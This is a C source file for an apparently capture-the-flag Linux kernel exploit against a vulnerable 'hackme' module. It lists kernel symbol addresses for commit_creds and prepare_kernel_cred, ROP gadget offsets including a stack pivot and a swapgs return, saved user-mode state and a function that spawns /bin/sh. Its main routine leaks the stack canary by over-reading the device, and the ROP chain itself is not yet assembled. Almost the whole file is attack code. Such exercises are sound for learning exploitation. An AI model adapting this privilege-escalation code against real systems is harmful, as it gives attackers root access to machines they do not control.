#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>



// ffffffffc0000000 t hackme_release       [hackme]
// ffffffffc0000020 t hackme_write [hackme]
// ffffffffc0000010 t hackme_open  [hackme]
// ffffffffc00000e0 t hackme_read  [hackme]
// ffffffffc0002000 d hackme_misc  [hackme]
// ffffffffc0000197 t hackme_exit  [hackme]
// ffffffffc00010a0 r hackme_fops  [hackme]
// ffffffffc0001076 r .LC1 [hackme]
// ffffffffc00011a0 r _note_7      [hackme]
// ffffffffc0002080 d __this_module        [hackme]
// ffffffffc0000197 t cleanup_module       [hackme]
// ffffffffc0002440 b hackme_buf   [hackme]


/*
 * proc # cat kallsyms | grep commit_creds
 * ffffffff814c6410 T commit_creds
 * ffffffff81f87d90 r __ksymtab_commit_creds
 * ffffffff81fa0972 r __kstrtab_commit_creds
 * ffffffff81fa4d42 r __kstrtabns_commit_creds
 *  proc # cat kallsyms | grep prepare_kernel_cred
 * ffffffff814c67f0 T prepare_kernel_cred
 * ffffffff81f8d4fc r __ksymtab_prepare_kernel_cred
 * ffffffff81fa09b2 r __kstrtab_prepare_kernel_cred
 * ffffffff81fa4d42 r __kstrtabns_prepare_kernel_cred
 */

typedef unsigned long long ull;

#define KERN_BASE (0xffff880000000000UL)
const unsigned long long kernel_base = 0xffff880000000000;

ull off_mov_rdi_rax_rep_pop_rbp_ret = 0xffffffff8100aedf - KERN_BASE; // : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; pop rbp ; ret
ull off_pop_rcx = 0xffffffff815f4bbc - KERN_BASE; // : pop rcx ; ret
ull off_pop_rdi = 0xffffffff81006370 - KERN_BASE; // : pop rdi ; ret
ull off_pop_r11 = 0xffffffff819452c5 - KERN_BASE; // : pop r11 ; ret

ull off_pivot_gadget = 0xffffffff81a14fba - KERN_BASE; // : mov esp, 0xc35dff9e ; xor eax, eax ; ret

ull off_prepare_kernel_cred = 0xffffffff814c67f0  - KERN_BASE;
ull off_commit_creds = 0xffffffff814c6410 - KERN_BASE;

ull off_swapgs_restore_regs_and_return_to_usermode = 0xffffffff8120011a - KERN_BASE;

ull addr_stack_page = 0x10000;


char buf[1024];

void shell(void) {
prepare_stack:
    __asm__ volatile (
            "mov rsp, %0\n\t"
            :
            : "r"(addr_stack_page + 0x1000)
            );
    char **argv = {
        "/bin/sh",
        NULL
    };
    execve("/bin/sh", argv, NULL);
}

ull user_cs, user_rflags, user_ss;
void save_state(void) {
    __asm__ volatile (
            "mov %0, cs\n\t"
            "pushfq\n\t"
            "pop %1\n\t"
            "mov %2, ss\n\t"
            : "=r" (user_cs), "=r" (user_rflags), "=r" (user_ss)
            :
            : "memory"
            );
}

int main(void) {
    save_state();

    int fd;
    if ((fd = open("/dev/hackme", O_RDWR)) < 0) {
        perror("open");
        return 1;
    }
    memset(buf, 0, sizeof(buf));
    read(fd, buf, 0x180);
    ull canary = *(ull *)(buf + 0x80);
    // printf("canary = 0x%llx\n", canary);

    int i;
    for (i = 0; i < 0x180; i += 8) {
        printf("%02x: 0x%016llx\n", i, *(ull *)(buf + i));
    }

    return 0;
}
